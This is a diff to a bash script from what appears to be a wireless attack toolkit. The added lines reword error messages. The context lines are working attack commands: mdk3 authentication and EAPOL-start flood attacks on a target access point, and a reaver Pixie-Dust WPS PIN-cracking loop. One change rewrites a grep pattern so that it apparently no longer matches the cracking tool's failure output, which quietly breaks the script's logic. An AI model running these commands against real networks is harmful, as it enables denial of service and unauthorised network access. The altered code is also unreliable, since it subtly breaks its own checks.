@@ -481,7 +481,7 @@ do
 					CURIN="${NI[$n]}"
 					if [[ "$CURIN" = "" ]]
 					then
-						echo -e ""$RS"eht3 returned an error (15) (Interface not found)"$CE""
+						echo -e ""$RS"eht3 returned an error (15) (Interface is not found)"$CE""
 						sleep 3
 					else
 						xterm -T "DOS flood on $CURIN" -hold -e 'mdk3 $CURIN a -a $BSSIDT -m && echo -e "" && echo -e "Close this window manually"' & disown
@@ -525,7 +525,7 @@ do
 					export CURIN
 					if [[ "$CURIN" = "" ]]
 					then
-						echo -e ""$RS"eht3 returned an error (16) (Interface not found)"$CE""
+						echo -e ""$RS"eht3 returned an error (16) (Interface is not found)"$CE""
 						sleep 3
 					else
 						xterm -T "EAPOL start flood on $CURIN" -geometry 80x11+0+"$OFSET" -hold -e 'mdk3 $CURIN x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
@@ -654,13 +654,13 @@ function pixie_loop
 		reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -K 1 -f -vvv <<< $'y\n' | tee /root/ehtools/wpslogloop
 		if [[ -f "$EPATH"/wpslog ]]
 		then
-			TTT=$(cat "$EPATH"/wpslogloop | grep "WPS pin not found!")
+			TTT=$(cat "$EPATH"/wpslogloop | grep "WPS pin is not found!")
 			TTTT=$(cat "$EPATH"/wpslogloop | grep "WPS pin:    <empty>")
 			TTT2=$(cat "$EPATH"/wpslogloop | grep "found")
 			TTT3=$(cat "$EPATH"/wpslogloop | grep "WPA")
 			if [[ "$TTT" != "" || "$TTTT" != "" ]]
 			then
-			        echo -e ""$RS"eht3 returned an error (4) (Pin not found)"$CE""
+			        echo -e ""$RS"eht3 returned an error (4) (Pin is not found)"$CE""
 			elif [[ "$TTT2" != "" || "$TT3" != "" ]]
 			then
 				echo -e ""$YS"Pin found!!"$CE""
@@ -668,7 +668,7 @@ function pixie_loop
 				sleep 2
 				break
 			else
-				echo -e ""$RS"eht3 returned an error (4) (Pin not found)"$CE""
+				echo -e ""$RS"eht3 returned an error (4) (Pin is not found)"$CE""
 			fi
 			if [[ "$DELAY" -gt 1 ]]
 			then
